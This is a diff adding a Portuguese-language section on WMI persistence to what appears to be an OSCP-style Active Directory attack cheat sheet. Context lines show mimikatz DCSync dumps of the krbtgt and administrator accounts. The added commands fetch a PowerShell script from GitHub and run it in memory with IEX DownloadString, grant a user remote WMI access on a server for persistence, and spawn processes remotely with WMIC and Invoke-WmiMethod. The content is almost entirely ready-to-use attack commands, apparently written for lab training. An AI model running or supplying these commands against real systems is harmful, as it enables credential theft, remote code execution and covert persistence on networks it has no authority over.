@@ -1711,6 +1711,41 @@ lsadump::dcsync /user:tech\krbtgt
 lsadump::dcsync /user:tech\administrator
 lsadump::dcsync /user:tech\goku
 ```
+### PERSISTENCE WMI
+##### PERSISTENCE WMI - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Set-RemoteWMI.ps1 -Outfile Set-RemoteWMI.ps1
+Import-Module .\Set-RemoteWMI.ps1
+```
+```
+IEX (New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Set-RemoteWMI.ps1")
+```
+ADICIONAR PERMISSÃO PARA ACESSAR TODO WMI LOCALMENTE E REMOTAMENTE: (RODANDO NO COMPUTADOR LOCAL)
+```
+Set-RemoteWMI -UserName vegeta -Verbose
+Set-RemoteWMI -UserNAme vegeta -namespace 'root\cimv2' -Verbose
+
+```
+ADICIONAR PERMISSÃO PARA ACESSAR TODO WMI LOCALMENTE E REMOTAMENTE: (RODANDO EM UM COMPUTADOR REMOTO)
+```
+Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -Credential administrator –namespace 'root\cimv2' -Verbose
+```
+REMOVER PERMISSÃO PARA ACESSAR TODO WMI LOCALMENTE E REMOTAMENTE:
+```
+Set-RemoteWMI -UserName vegeta -Verbose -Remove
+Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -namespace 'root\cimv2' -Remove -Verbose
+Set-RemoteWMI -UserName vegeta -ComputerName tech-server01 -Credential administrator -namespace 'root\cimv2' -Remove -Verbose
+```
+CRIAR UM PROCESSO REMOTAMENTE:
+```
+WMIC process call create "cmd.exe /k whoami /all"
+WMIC /node:127.0.0.1 process call create "cmd.exe /k whoami /all"
+wmic /node:127.0.0.1 /user:teste process call create "cmd.exe /c calc"
+Invoke-WmiMethod win32_process -name create -argumentlist "ping google.com"
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd /k whoami /all'
+```
+
 
 
 
